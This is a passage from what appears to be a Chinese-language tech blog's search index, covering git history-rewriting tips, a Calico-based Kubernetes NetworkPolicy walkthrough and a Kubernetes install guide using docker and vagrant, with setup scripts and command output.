hugepages_surp=0 hugepages_size=1048576kB[ 6392.495906] Node 0 hugepages_total=0 hugepages_free=0 hugepages_surp=0 hugepages_size=2048kB[ 6392.495907] 104000 total pagecache pages[ 6392.495908] 0 pages in swap cache[ 6392.495909] Swap cache stats: add 0, delete 0, find 0/0[ 6392.495910] Free swap = 2097148kB[ 6392.495910] Total swap = 2097148kB[ 6392.495911] 1048429 pages RAM[ 6392.495912] 0 pages HighMem/MovableOnly[ 6392.495912] 74964 pages reserved[ 6392.495913] 0 pages cma reserved[ 6392.495913] 0 pages hwpoisoned","tags":["linux"]},{"title":"git usage","path":"/2016/11/01/git/","content":"0x00 workflowgit 的工作流程，已 k8s devel 的开发者文档里面图来说明： workflow 首先在 fork 代码，然后 clone 到本地，创建分支并修改代码，commit 发 PR 或者 rebase&#x2F;fetch 别人的代码后修改发 PR. 0x01 tips Merge another branch of the same git-repo 1git merge branch-name Pick up a specific commit from another branch 1git cherry-pick commit-name Merge a branch from another local git repo 1git pull /path/to/git-repo branch-name Rebase your commits 1git rebase -i commit-nameˆ Rebase a branch onto master 1git rebase –onto master –root Delete a remote branch 1git push origin :branch Example of generate and release kernel patches Generate patches1git format-patch -s –cover-letter –thread commit1ˆ..commit2 –cc=&quot;Name &lt;user@example.com&gt;&quot; Check&amp;fix up your patches Documentation/SubmitChecklist, script/checkpatch.pl cleanfile Release your patches Config send-email:1git config, man git-send-email(Sending) Get maintainers:1./scripts/get maintainer.pl Send out your patch:1git send-email –to=”LKML &lt;linux-kernel@vger.kernel.org&gt;” –cc=&quot;Maintainers’ Email Address&quot; 0x10 filter-branchgit 的本质是内容寻址文件系统，有时候需要 undo 操作消除敏感信息是不够的，关于更多 git 底层信息参考 progit^progit.有时候脑抽了，把敏感资料或者一个大的 binary commit 上去了，想要补救。 0x11 Clear sensitive files12345678910111213$ ls password password$ git filter-branch --index-filter &quot;git rm -rf --cached --ignore-unmatch password&quot; --prune-empty -- --all Rewrite be0acf636754aea731c0b1f285142143dbf0275f (2/3) (0 seconds passed, remaining 0 predicted) rm &#x27;password&#x27;Rewrite c3cc58dc9ebe7cf1f3187a0a6172e1bb274b3921 (3/3) (0 seconds passed, remaining 0 predicted) rm &#x27;password&#x27;Ref &#x27;refs/heads/master&#x27; was rewritten$ lschcon init$ git show 100644fatal: ambiguous argument &#x27;100644&#x27;: unknown revision or path not in the working tree.Use &#x27;--&#x27; to separate paths from revisions, like this:&#x27;git &lt;command&gt; [&lt;revision&gt;...] -- [&lt;file&gt;...]&#x27; 0x12 remove the largest file通过 git 阅读索引文件 (拓展名.idx),确认哪个 object 最大 1234$ git verify-pack -v .git/objects/pack/pack-f92ea95d8f9a18dd42335fc3e3bd25feb8ed5ef8.idx | sort -k 3 -n | tail -31d07197534891b5d45286850f7202dc1f84beceb blob 2885745 2873595 1124278061ba4967a562aaff8d1208981a2f1be968c969fd blob 8929280 3255190 3940716353a62618f023052c25db90d5c3f6725cadfbd95 blob 9263612 2936691 73858887 查看体积最大的 hash 属于哪个文件 12$ git rev-list --objects --all | grep 353a62618f023052c25db90d5c3f6725cadfbd95353a62618f023052c25db90d5c3f6725cadfbd95 vendor/github.com/go-openapi/spec/debug.test 确认该文件属于哪个 commit 12$ git --no-pager log --pretty=oneline --branches -- vendor/github.com/go-openapi/spec/debug.test da1f2c61c603e1cadc89e2cc690d46d2f972501e Update vendor packages (#1378) 要移除这个文件需要利用 filter-barch 重写自da1f2c61c603e1cadc89e2cc690d46d2f972501e的全部历史，注意 commitid 后面的^与.. 12345678910$ git filter-branch --index-filter &#x27;git rm --cached --ignore-unmatch vendor/github.com/go-openapi/spec/debug.test&#x27; -- da1f2c61c603e1cadc89e2cc690d46d2f972501e^..Rewrite da1f2c61c603e1cadc89e2cc690d46d2f972501e (1/8) (0 seconds passed, remaining 0 predicted) rm &#x27;vendor/github.com/go-openapi/spec/debug.test&#x27;Rewrite 8c83a03a1b84fd18830b8bfaf1ea09ba5cc93e78 (2/8) (0 seconds passed, remaining 0 predicted) rm &#x27;vendor/github.com/go-openapi/spec/debug.test&#x27;Rewrite 3fe627bb58a2f081a7976a13dd0b014c5c882bcb (3/8) (0 seconds passed, remaining 0 predicted) rm &#x27;vendor/github.com/go-openapi/spec/debug.test&#x27;Rewrite dd3ef7d823313445774d2ed577f67d2da37a1568 (4/8) (1 seconds passed, remaining 1 predicted) rm &#x27;vendor/github.com/go-openapi/spec/debug.test&#x27;Rewrite 0b0bafce155f20be369f35da045fb6338bf38e24 (4/8) (1 seconds passed, remaining 1 predicted) rm &#x27;vendor/github.com/go-openapi/spec/debug.test&#x27;Rewrite fd18f0e6895bbfc144051e928d8c77a110fb2978 (4/8) (1 seconds passed, remaining 1 predicted) rm &#x27;vendor/github.com/go-openapi/spec/debug.test&#x27;Rewrite 69e2d04e0f4f69f9c6c0c5d24b4b6b07490d347d (4/8) (1 seconds passed, remaining 1 predicted) rm &#x27;vendor/github.com/go-openapi/spec/debug.test&#x27;Rewrite 645191d3ff4cf9e898c9e5796b86dc010c095630 (4/8) (1 seconds passed, remaining 1 predicted) rm &#x27;vendor/github.com/go-openapi/spec/debug.test&#x27;Ref &#x27;refs/heads/master&#x27; was rewritten 清理 reflog 对象 12345678$ rm -Rf .git/refs/original$ rm -Rf .git/logs/$ git gcCounting objects: 36023, done.Delta compression using up to 4 threads.Compressing objects: 100% (18106/18106), done.Writing objects: 100% (36023/36023), done.Total 36023 (delta 16535), reused 35996 (delta 16515) 对比一下清理前后，其中size-pack是以 kB 为单位进行记录大小的。 12345678910111213141516171819$ git count-objects -vcount: 0size: 0in-pack: 36023packs: 1size-pack: 77904prune-packable: 0garbage: 0size-garbage: 0$ git count-objects -vcount: 0size: 0in-pack: 36003packs: 1size-pack: 77911prune-packable: 0garbage: 0size-garbage: 0","tags":["tips"]},{"title":"kubernetes II - network policy","path":"/2016/09/13/k8s-ii/","content":"0x00 design在 kubernetes 项目中一般的提案会在 repo 的docs/proposals下面，这次我主要关注networkPolicy相关提案，关于 networkpolicy 早期的会议讨论可以见 [^meeting], 提供一个 case[^draft2] 可以看到典型的应用方式，社区讨论定稿为 [^manuscript], 第一次提交的代码在 patch #25638,通过issues&#x2F;22469来追踪。初步接触 networkpolicy 个人习惯还是从如何使用开始，以下基于配置完成后的整理，如果问题还请斧正。 0x10 create a cluster首选在本地配置单个 node 和 master 的 k8s 的集群，推荐go get拉取回来的源码目录中的cluster/kube-up.sh进行集群部署，我比较懒所以写个一个脚本做了个 wapper 把一些变量放进去了。 12345678910111213141516171819202122232425262728293031323334353637383940414243#!/bin/bashiptables -Fiptables -Ziptables -Xexport KUBERNETES_PROVIDER=vagrantexport KUBERNETES_VAGRANT_USE_NFS=trueexport ALLOW_PRIVILEGED=trueexport VAGRANT_HTTP_PROXY=http://username:password@10.0.58.88:8080export VAGRANT_HTTPS_PROXY=http://username:password@10.0.58.88:8080install() &#123; rpm -qa | grep vagrant-libvirt if [ $? != 0 ]; then dnf install vagrant-libvirt -y fi pushd $GOPATH/src/github.com/kubernetes/kubernetes ./cluster/kube-up.sh popd exit 0&#125;remove() &#123; sudo virsh destroy kubernetes_master sudo virsh destroy kubernetes_node-1 sudo virsh undefine kubernetes_master sudo virsh undefine kubernetes_node-1 sudo rm -rf /var/lib/libvirt/images/kubernetes_* sudo rm -rf /var/lib/libvirt/qemu/ sudo rm -rf /var/lib/libvirt/dnsmasq/ sudo systemctl restart libvirtd.service exit 0&#125;down() &#123; ./cluster/kube-down.sh exit 0&#125;$1echo &quot;please input $0 install or $0 remove&quot; VAGRANT_HTTP_PROXY变量是 vagrant 提供的一个插件可以在创建的虚拟机节点中注入代理环境变量，使用NFS避免了rsync造成额外的磁盘浪费，如果还需要预配置一些奇怪的东西比如dnf代理在虚拟机节点中可以 1qemu-system-x86_64 /var/lib/libvirt/images/kube-fedora23_vagrant_box_image_0.img -m 2048 开启虚拟机在其中修改配置文件，然后退出注意一致性问题 (比如 dnf 被C+c遗留.lock 文件), 重新运行我的小 wapper 把一些遗留的配置文件清理掉，然后重新创建，一切正常可以看见集群信息 123456789$ kubectl cluster-infoKubernetes master is running at https://10.245.1.2Heapster is running at https://10.245.1.2/api/v1/proxy/namespaces/kube-system/services/heapsterKubeDNS is running at https://10.245.1.2/api/v1/proxy/namespaces/kube-system/services/kube-dnskubernetes-dashboard is running at https://10.245.1.2/api/v1/proxy/namespaces/kube-system/services/kubernetes-dashboardGrafana is running at https://10.245.1.2/api/v1/proxy/namespaces/kube-system/services/monitoring-grafanaInfluxDB is running at https://10.245.1.2/api/v1/proxy/namespaces/kube-system/services/monitoring-influxdbTo further debug and diagnose cluster problems, use &#x27;kubectl cluster-info dump&#x27;. 0x20 install network solution Kubernetes itself doesn’t enforce NetworkPolicy. You’ll need to run a networking solution like Calico, Canal, etc as your network plugin to get NetworkPolicy features. network solution 选择了 calico 并且选择手工配置将其添加到已经存在的集群当中。 0x21 准备镜像在 master 和 node 上面 pull 镜像 123docker pull docker.io/calico/cnidocker pull docker.io/calico/kube-policy-controllerdocker pull quay.io/calico/node 0x22 准备 kubelet在 master 和 node 分别 下载必要命令行工具，虽然loopback在 master 不是必须的但是多一个也无所谓 (懒得改脚本) 12345678910wget http://www.projectcalico.org/builds/calicoctlsudo chmod +x calicoctlwget -N -P /opt/cni/bin https://github.com/projectcalico/calico-cni/releases/download/v1.4.1/calicowget -N -P /opt/cni/bin https://github.com/projectcalico/calico-cni/releases/download/v1.4.1/calico-ipamchmod +x /opt/cni/bin/calico /opt/cni/bin/calico-ipamwget https://github.com/containernetworking/cni/releases/download/v0.3.0/cni-v0.3.0.tgztar -zxvf cni-v0.3.0.tgzcp loopback /opt/cin/bin/ master 和 node 添加配置文件 123456789101112131415mkdir -p /etc/cni/net.dcat &gt;/etc/cni/net.d/10-calico.conf &lt;&lt;EOF&#123; &quot;name&quot;: &quot;calico-k8s-network&quot;, &quot;type&quot;: &quot;calico&quot;, &quot;etcd_endpoints&quot;: &quot;http://&lt;ETCD_IP&gt;:&lt;ETCD_PORT&gt;&quot;, &quot;log_level&quot;: &quot;info&quot;, &quot;ipam&quot;: &#123; &quot;type&quot;: &quot;calico-ipam&quot; &#125;, &quot;policy&quot;: &#123; &quot;type&quot;: &quot;k8s&quot; &#125;&#125;EOF 因为通过cluster/kube-up.sh创建的集群是通过 systemd 管理的 kubelet 启动所以命令行参数的传入位于/etc/sysconfig/kubelet, 添加DAEMON_ARGS变量添加--network-plugin=cni --cni-conf-dir=/etc/cni/net.d --network-plugin-dir=/etc/cni/net.d,而后重新启动服务。 0x23 创建 calico node在 master 和 node 上面分别ETCD_ENDPOINTS是你 master 和 master 的 etcd 的端口。 1ETCD_ENDPOINTS=http://10.245.1.2:4379 ./calicoctl node 然后在任意机器下面都可以看见 123456789101112[root@kubernetes-master ~]# ETCD_ENDPOINTS=http://10.245.1.2:4379 ./calicoctl statuscalico-node container is running. Status: Up About a minuteRunning felix version 1.4.0IPv4 BGP statusIP: 10.245.1.2 AS Number: 64511 (inherited)+--------------|-------------------|-------|----------|-------------+| Peer address | Peer type | State | Since | Info |+--------------|-------------------|-------|----------|-------------+| 10.245.1.3 | node-to-node mesh | up | 08:22:15 | Established |+--------------|-------------------|-------|----------|-------------+ 0x24 创建 policy-controller在开发机上下载policy-controller并修改其中的ETCD_ENDPOINTS和images(使用现有的镜像比较快). 1234567891011spec: hostNetwork: true containers: - name: calico-policy-controller # Make sure to pin this to your desired version. image: calico/kube-policy-controller env: # Configure the policy controller with the location of # your etcd cluster. - name: ETCD_ENDPOINTS value: &quot;http://10.245.1.2:4379&quot; 在开发机上通过上面下载的yaml文件创建controller. 1$ kubectl create -f policy-controller.yaml 0x25 配置确认在开发机器上确认一下 calico-policy-controller 的状态是否正常。 12345678$ kubectl get pod --namespace=kube-systemNAME READY STATUS RESTARTS AGEcalico-policy-controller-0i4so 1/1 Running 1 23hheapster-v1.2.0-2582472167-91sw6 4/4 Running 24 4dkube-dns-v19-dfhx9 3/3 Running 41 4dkube-proxy-kubernetes-node-1 1/1 Running 7 4dkubernetes-dashboard-v1.4.0-gydiz 1/1 Running 22 4dmonitoring-influxdb-grafana-v4-auln8 2/2 Running 15 4d 并确认 master 和 node 上 calico-node 容器是否正常。 0x30 test network policy在开发机上面创建 namespace 名为 test 且在对其配置每 pod 隔离，并在其中创建名为 nginx 的 deployment 和 service, 1234kubectl create ns test # 创建 test 命名空间kubectl annotate ns test &quot;net.beta.kubernetes.io/network-policy=&#123;\\&quot;ingress\\&quot;: &#123;\\&quot;isolation\\&quot;: \\&quot;DefaultDeny\\&quot;&#125;&#125;&quot; --overwrite # 每 pod 隔离kubectl --namespace=test run nginx --image=nginx # 创建 deployment kubectl --namespace=test expose deployment nginx --port=80 # 创建 service 在 test 宣告默认 deny 时候可以在 master 或者 node 上面运行如下。 12345678910111213[root@kubernetes-node-1 ~]# ETCD_ENDPOINTS=http://10.245.1.2:4379 ./calicoctl profile show+--------------------+| Name |+--------------------+| k8s_ns.default || k8s_ns.kube-system || k8s_ns.test |+--------------------+[root@kubernetes-node-1 ~]# ETCD_ENDPOINTS=http://10.245.1.2:4379 ./calicoctl profile k8s_ns.test rule showInbound rules: 1 denyOutbound rules: 1 allow 查看信息，pod 是不是正常运行。 12345kubectl --namespace=test get svc,podNAME CLUSTER-IP EXTERNAL-IP PORT(S) AGEsvc/nginx 10.247.114.187 &lt;none&gt; 80/TCP 3hNAME READY STATUS RESTARTS AGEpo/nginx-701339712-wcim9 1/1 Running 0 3h 0x31 测试配置每 pod 隔离，然后配置 networkpolicy 的 selector . 12345678910111213141516171819202122232425262728293031323334353637$ kubectl annotate ns test &quot;net.beta.kubernetes.io/network-policy=&#123;\\&quot;ingress\\&quot;: &#123;\\&quot;isolation\\&quot;: \\&quot;DefaultDeny\\&quot;&#125;&#125;&quot; --overwritenamespace &quot;test&quot; annotated$ cat network-policy.yaml kind: NetworkPolicyapiVersion: extensions/v1beta1metadata: name: access-nginx namespace: testspec: podSelector: matchLabels: run: nginx ingress: - from: - podSelector: matchLabels: access: &quot;true&quot;$ kubectl create -f network-policy.yaml networkpolicy &quot;access-nginx&quot; created$ kubectl --namespace=test run busybox --rm -ti --labels=&quot;access=true&quot; --image=busybox /bin/sh Waiting for pod test/busybox-3554646944-irgeg to be running, status is Pending, pod ready: falseIf you don&#x27;t see a command prompt, try pressing enter./ # wget nginxConnecting to nginx (10.247.114.187:80)index.html 100% |**********************************************************************************************************************************************************| 612 0:00:00 ETA/ # Session ended, resume using &#x27;kubectl attach busybox-3554646944-irgeg -c busybox -i -t&#x27; command when the pod is runningdeployment &quot;busybox&quot; deleted$ kubectl --namespace=test run busybox --rm -ti --image=busybox /bin/sh Waiting for pod test/busybox-3674381263-0solq to be running, status is Pending, pod ready: falseIf you don&#x27;t see a command prompt, try pressing enter./ # wget --timeout=1 nginxConnecting to nginx (10.247.114.187:80)wget: download timed out/ # Bingo! 可以看见不带标签的被隔离了，带标签的正常运行。 [^user-stories]: Kube Networking User Stories[^meeting]: Kubernetes Network SIG Meeting[^draft2]: Kubernetes NetworkPolicy draft 2[^manuscript]: NetworkPolicy[^walkthrough]: walkthrough[^networkinterface]: container network interface","tags":["docker"]},{"title":"kubernetes I - learn & install","path":"/2016/09/13/k8s-i/","content":"0x00 background因新项目与 kubernetes 本身相关，而我对 kubernetes 的复杂一无所知，所以需要探索它。这个 post 主要记录学习 k8s 梳理出来的 XCx 基本概念以及如何参与开发，部分图片来源于 [^slideshare], 大量资料来自 [^officialdoc], 有点补充”官网的文档不如 repo 里面来的全面”! 0x01 what’s kubernetes ?Kubernetes(缩写 k8s) 是 Google 开源的容器集群管理系统，主要是 go 实现，其目的是提供应用部署，维护，扩展机制等功能，利用 Kubernetes 能方便地管理跨机器运行容器化的应用。其主要功能如下： 使用 Docker 对应用程序包装 (package), 实例化 (instantiate), 运行 (run). 以集群的方式运行，管理跨机器的容器。 解决 Docker 跨机器容器之间的通讯问题。 Kubernetes 的自我修复机制使得容器集群总是运行在用户期望的状态。 0x02 why kubernetes?kubernetes 是容器编排工具，目前这是最具竞争的领域之一，少数几个容器管理简单，但是调度管理以及监控大规模容器很具有挑战性，编排工具处理多种多样任务，如查找最优的位置或者服务器来运行容器，处理失败的任务，分享储存卷或者创建负载均衡与容器间通讯的覆盖网络等。常见的容器编排项目如下： Kubernetes: 是 Googlet 团队发起并维护的，目前在功能特性方面是最先进的。 Docker Swarm: 允许在 Docker 集群中调度容器，与 Docker 环境紧密集成。 Mesosphere: 通用数据中心管理系统，也能管理容器，还可以与其它编排系统 (如 Kubernetes) 集成。 CoreOS fleet: CoreOS 操作系统的一部分，管理在 CoreOS 集群中任何调度命令。 0x10 k8s architecture[^design]k8s 的架构设计： 架构图 由图可见 Kubernetes 首先是一套分布式系统，节点分为两类：一类是属于管理平面的主节点 &#x2F; 控制节点 (Master Node); 一类是属于运行平面的工作节点 (Worker Node); 复杂的工作交给控制节点去做了，工作节点负责提供稳定的操作接口和能力抽象。没有能发现 Kubernetes 中对于控制平面的分布式实现，但是由于数据后端自身就是一套分布式的数据库 (etcd), 因此可以很容易扩展到分布式实现。 0x11 The Kubernetes Node kubelet: 是工作节点执行操作的 agent, 负责具体的容器生命周期管理，根据从数据库中获取的信息来管理容器，并上报 pod 运行状态等; kube-proxy: 是一个简单的网络访问代理，同时也是一个 Load Balancer. 它负责将访问到某个服务的请求具体分配给工作节点上的 Pod(同一类标签). 0x12 The Kubernetes Control Planeservices of master node apiserver 是整个系统的对外接口，提供一套 RESTful 的 Kubernetes API, 供客户端和其它组件调用; scheduler 负责对资源进行调度，分配某个 pod 到某个节点上是 pluggable 的，意味着很容易选择其它实现方式; controller-manager 负责管理控制器，包括 endpoint-controller(刷新服务和 pod 的关联信息) 和 replication-controller(维护某个 pod 的复制为配置的数值). worker kubelet 是工作节点执行操作的 agent, 负责具体的容器生命周期管理，根据从数据库中获取的信息来管理容器，并上报 pod 运行状态等; kube-proxy 是一个简单的网络访问代理，同时也是一个 Load Balancer. 它负责将访问到某个服务的请求具体分配给工作节点上的 Pod(同一类标签). etcd etcd 作为数据后端，又作为消息中间件，通过 etcd 来存储所有的主节点上的状态信息，很容易实现主节点的分布式扩展，组件可以自动的去侦测 etcd 中的数值变化来获得通知，并且获得更新后的数据来执行相应的操作。 0x20 quick practice前面简要说明架构设计，这里介绍一些 k8s 的几个概念与主要组件作用图示，在快速实践中会对其有个初步印象，更多概念性的东西参考 [^term]. Cluster: 集群是指由 Kubernetes 使用一系列的物理机，虚拟机和其他基础资源来运行你的应用程序。 Node: 一个节点是一个运行 Kubernetes 中的主机。 Pod: 一个 Pod 对应于由若干容器组成的一个容器组，同个组内的容器共享一个存储卷 (volume). Pos-states: 包含所有容器状态集合，包括容器组状态类型，容器组生命周期，事件，重启策略，以及 replication controllers. Replication-Controllers: 主要负责指定数量的 pod 在同一时间一起运行。 Services: 一个 Kubernetes 服务是容器组逻辑的高级抽象，同时也对外提供访问容器组的策略。 Volumes: 一个卷就是一个目录，容器对其有访问权限。 Labels: 标签是用来连接一组对象的，比如容器组。标签可以被用来组织和选择子对象。 Namespace : Namespace 好比一个资源名字的前缀。它帮助不同的项目，团队或是客户可以共享 cluster, 防止命名冲突。 selector: 是一个通过匹配 labels 来定义资源之间关系得表达式，例如为一个负载均衡的 service 指定所目标 Pod. 单节点从 docker 快速部署 k8s 逻辑示意图： 0x21 by docker利用 docker 可以快速上手 k8s(仅限于单机), 不过在 1.3 的分支里面这个文档已经被弄丢了。在使用 docker 之前依赖先决条件 (kernel 支持 memory and swap accounting, 启用 cgroup 的 momory 控制器), 不过你默认安装较新的 linux 发行版一般都能满足。手工拉取一个镜像gcr.io/google_containers/hyperkube:v1.3.7, 利用这个镜像创建容器时候会自己拉取其他镜像。 123456$ sudo docker imagesREPOSITORY TAG IMAGE ID CREATED SIZE$ sudo docker pull gcr.io/google_containers/hyperkube:v1.3.7$ sudo docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEgcr.io/google_containers/hyperkube v1.3.7 24db5b90d9c0 8 days ago 404.7 MB master启动主节点。 1234567891011121314151617# docker run \\ --volume=/:/rootfs:ro \\ --volume=/sys:/sys:ro \\ --volume=/dev:/dev \\ --volume=/var/lib/docker/:/var/lib/docker:ro \\ --volume=/var/lib/kubelet/:/var/lib/kubelet:rw \\ --volume=/var/run:/var/run:rw \\ --net=host \\ --pid=host \\ --privileged=true \\ -d \\ gcr.io/google_containers/hyperkube:v1.3.7 \\ /hyperkube kubelet --containerized \\ --hostname-override=&quot;127.0.0.1&quot; \\ --address=&quot;0.0.0.0&quot; \\ --api-servers=http://localhost:8080 \\ --config=/etc/kubernetes/manifests service proxy在 tag 1.3.7 里面不需要手工去 etcd 了，在启动服务代理时候会自动帮启动。 12345# docker run -d --net=host \\ --privileged gcr.io/google_containers/hyperkube:v1.3.7 \\ /hyperkube proxy \\ --master=http://127.0.0.1:8080 \\ --v=2 启动完成主节点与服务代理过后，经过一段时间等待 (猜测时间长短取决于网速), 可以发现镜像依赖自己解决了。 1234567891011$ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEgcr.io/google_containers/hyperkube-amd64 v1.3.7 24db5b90d9c0 8 days ago 404.7 MBgcr.io/google_containers/hyperkube v1.3.7 24db5b90d9c0 8 days ago 404.7 MBgcr.io/google_containers/kubernetes-dashboard-amd64 v1.1.1 f739d2414b14 6 weeks ago 55.83 MBgcr.io/google_containers/exechealthz-amd64 1.1 c3a89c92ef5b 7 weeks ago 8.332 MBgcr.io/google_containers/kubedns-amd64 1.5 3afb7dbce540 12 weeks ago 50.82 MBgcr.io/google-containers/kube-addon-manager-amd64 v4 fb28c478466a 3 months ago 240.4 MBgcr.io/google_containers/kube-dnsmasq-amd64 1.3 9a15e39d0db8 3 months ago 5.126 MBgcr.io/google_containers/pause-amd64 3.0 99e59f495ffa 4 months ago 746.9 kBgcr.io/google_containers/etcd-amd64 2.2.5 72bd8a257d7a 5 months ago 30.45 MB testing在其中开始一个 kube-ui 部署。 123456789101112131415161718192021$ sudo dnf install kubernetes-client -y # 安装命令行工具$ kubectl cluster-infoKubernetes master is running at http://localhost:8080KubeDNS is running at http://localhost:8080/api/v1/proxy/namespaces/kube-system/services/kube-dnskubernetes-dashboard is running at http://localhost:8080/api/v1/proxy/namespaces/kube-system/services/kubernetes-dashboard$ kubectl get nodeNAME STATUS AGE127.0.0.1 Ready 2m$ sudo docker pull gcr.io/google_containers/kube-ui:v5 # 把镜像拉回来, 避免下一条指令的漫长等待Trying to pull repository gcr.io/google_containers/kube-ui ... v5: Pulling from gcr.io/google_containers/kube-uia3ed95caeb02: Pull complete 71c3140c0e84: Pull complete Digest: sha256:2165d142900fefb3605533e649de5f0276e82697dc548b5a60e1a455b1cf20ffStatus: Downloaded newer image for gcr.io/google_containers/kube-ui:v5$ kubectl -s http://localhost:8080 run kube-ui --image=gcr.io/google_containers/kube-ui:v5 --port=80deployment &quot;kube-ui&quot; created 访问 http://master_node_ip:8080&#x2F;ui. 这时候你初步接触完成了你准备把环境还原 (保留镜像). 12$ for ((i=0; i&lt;2; i++)); do docker rm -f `docker ps -qa`; done$ for i in $(mount | grep kube | cut -d&#x27; &#x27; -f 3-3 | tr &#x27; &#x27; &#x27; &#x27;); do umount $i; done &amp;&amp; rm -rf /var/lib/kubelet/ 0x22 by vagrant[^vagrant]这个方法 k8s 开发者常用的部署方法之一 – 在本地创建基于虚拟机的集群。源码的安装个人喜欢go get github.com/kubernetes/kubernetes方式拉代码回来。关于二进制部署安利 NFS 方法，nfs 对比默认的 rsync, 使用 nfs 建立集群速度快，节约磁盘空间 (我遇到磁盘 100%). 如果你 (比如我手贱) 操作失误误删/var/lib/libvirt, 需要下面的指令来重新创建 default-pool. 1234567891011# virsh pool-define /dev/stdin &lt;&lt;EOF&lt;pool type=&#x27;dir&#x27;&gt; &lt;name&gt;default&lt;/name&gt; &lt;target&gt; &lt;path&gt;/var/lib/libvirt/images&lt;/path&gt; &lt;/target&gt;&lt;/pool&gt;EOF# virsh pool-start default# virsh pool-autostart default 通过项目自己带的脚本部署的脚本大体轮廓是下面这样，至于为什么调用那么多rm -rf是因为我是处女座喜欢每一次的 master 节点都是 1,node 是 2 依次排列下去。可以通过dnf install vagrant-libvirt redhat-lsb-cxx redhat-rpm-config-41-2 -y &amp;&amp; vagrant plugin install vagrant-proxyconf安装 vagrant 和一个代理插件。 123456789101112131415161718192021222324252627282930313233#!/bin/bashexport KUBERNETES_PROVIDER=vagrantexport KUBERNETES_VAGRANT_USE_NFS=trueexport VAGRANT_HTTP_PROXY=http:/username:password@10.0.58.88:8080export VAGRANT_HTTPS_PROXY=http://username:password@10.0.58.88:8080iptables -Xiptables -Fiptables -Zinstall() &#123; rpm -qa | grep vagrant-libvirt if [ $? != 0 ]; then dnf install vagrant-libvirt -y fi vagrant plugin install vagrant-proxyconf # 让 vagrant 支持的代理的插件 pushd $GOPATH/src/github.com/kubernetes/kubernetes ./cluster/kube-up.sh popd&#125;remove() &#123; sudo virsh destroy kubernetes_master sudo virsh destroy kubernetes_node-1 sudo virsh undefine kubernetes_master sudo virsh undefine kubernetes_node-1 sudo rm -rf /var/lib/libvirt/images/kubernetes_* sudo rm -rf /var/lib/libvirt/qemu/ sudo rm -rf /var/lib/libvirt/dnsmasq/ sudo systemctl restart libvirtd.service&#125;$1 在使用项目在自带脚本去建立集群时想在虚拟机节点里面预配置东西 (如:dnf 代理，环境变量) 可以切到/var/lib/libvirt/images, 到这里看见镜像模板，节点都是基于这个镜像做差异生成的，可以qemu-system-x86_64 kube-fedora23_vagrant_box_image_0.img启动它，手工修改配置后关机。(如果在 nfs 挂载时候 hang 住了，多数可能是防火墙问题记得清理一下). 虽然初始化两个节点起来成功了，但是 k8s 集群并没有起来，看上面图片显示需要自己 make 一个 release 出来，在开发机器上进入 repo 的目录sudo make quick-release, 过后重新跑以上脚本，然后大体上看到下面这个就算开发环境部署起来了，这时候 repo 下面有个 vagrant 生成的目录里面记录这节点一些信息，只有在当前目录vagrant ssh master才能有效。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546This can take some time based on your network, disk, and cpu speed.It is possible for an error to occur during Salt provision of cluster and this could loop forever.Validating masterValidating node-1..............................................Waiting for each node to be registered with cloud providerFlag --api-version has been deprecated, flag is no longer respected and will be deleted in the next releaseValidating we can run kubectl commands.Connection to 192.168.121.223 closed.Kubernetes cluster is running.The master is running at: https://10.245.1.2Administer and visualize its resources using Cockpit: https://10.245.1.2:9090For more information on Cockpit, visit http://cockpit-project.orgThe user name and password to use is located in /root/.kube/config... calling validate-clusterFound 1 node(s).NAME STATUS AGEkubernetes-node-1 Ready 6mCluster not working yet.Validate output:NAME STATUS MESSAGE ERRORscheduler Healthy ok controller-manager Healthy ok etcd-1 Healthy &#123;&quot;health&quot;: &quot;true&quot;&#125; etcd-0 Healthy &#123;&quot;health&quot;: &quot;true&quot;&#125; Cluster validation succeededDone, listing cluster services:Kubernetes master is running at https://10.245.1.2Heapster is running at https://10.245.1.2/api/v1/proxy/namespaces/kube-system/services/heapsterKubeDNS is running at https://10.245.1.2/api/v1/proxy/namespaces/kube-system/services/kube-dnskubernetes-dashboard is running at https://10.245.1.2/api/v1/proxy/namespaces/kube-system/services/kubernetes-dashboardGrafana is running at https://10.245.1.2/api/v1/proxy/namespaces/kube-system/services/monitoring-grafanaInfluxDB is running at https://10.245.1.2/api/v1/proxy/namespaces/kube-system/services/monitoring-influxdbTo further debug and diagnose cluster problems, use &#x27;kubectl cluster-info dump&#x27;. kube-push脚本的工作实在是太慢了，因为用kube-up自动创建集群前已经声明使用 NFS 做共享了，在节点的/vagrant可以看见开发机上面的 repo 目录。 12345678910111213141516171819202122232425262728293031323334353637[root@localhost kubernetes]# free -m total used free shared buff/cache availableMem: 31966 3763 6175 4 22027 27757Swap: 15999 0 15999[root@localhost kubernetes]# lscpu Architecture: x86_64CPU op-mode(s): 32-bit, 64-bitByte Order: Little EndianCPU(s): 8On-line CPU(s) list: 0-7Thread(s) per core: 2Core(s) per socket: 4Socket(s): 1NUMA node(s): 1Vendor ID: GenuineIntelCPU family: 6Model: 58Model name: Intel(R) Core(TM) i7-3770 CPU @ 3.40GHzStepping: 9CPU MHz: 1603.046CPU max MHz: 3900.0000CPU min MHz: 1600.0000BogoMIPS: 6783.90Virtualization: VT-xL1d cache: 32KL1i cache: 32KL2 cache: 256KL3 cache: 8192KNUMA node0 CPU(s): 0-7...[root@localhost kubernetes]# time ./cluster/kube-push.sh...real 52m8.300suser 0m6.753ssys 0m0.856s 0x30 the network of k8sk8s 采用扁平化的网络模型，每个 pod 都有一个全局唯一的 ip,pod 之间可以跨主机通信，相比于 Docker 原生的 NAT 方式来说，这样使得容器在网络层面更像虚拟机或者物理机，复杂度整体降低，更加容易实现服务发现，迁移，负载均衡等功能。为了实现这个目标 k8s 网络完成的工作如下： 紧耦合的容器之间通信，通过 pod 和 localhost 访问解决。 pod 之间通信，建立通信子网，比如隧道，路由，Flannel,Open vSwitch, Weave. pod 和 service, 以及外部系统和 Service 的通信，引入 Service 解决。 Kubernetes 的网络会给每个 Pod 分配一个 IP 地址，不需要在 Pod 之间建立链接，也基本不需要去处理容器和主机之间的端口映射。注意：pod 重建后，IP 会被重新分配，所以内网通信不要依赖 Pod IP; 通过 Service 环境变量或者 DNS 解决。 0x40 testing in k8s在发 pr 前你需要确认你的修改至少通过了单元测试与集成测试，如果要想被合并还要通过端到端的测试也是必须的。测试的代码组织是利用 golang 的 testing. 0x41 unit testing你可以在单元测试期间使用KUBE_GOFLAGS变量来设置 go flags.运行全部的单元测试。 12cd kubernetesmake test # Run all unit tests. 运行单个包或者多个的单元测试。 12make test 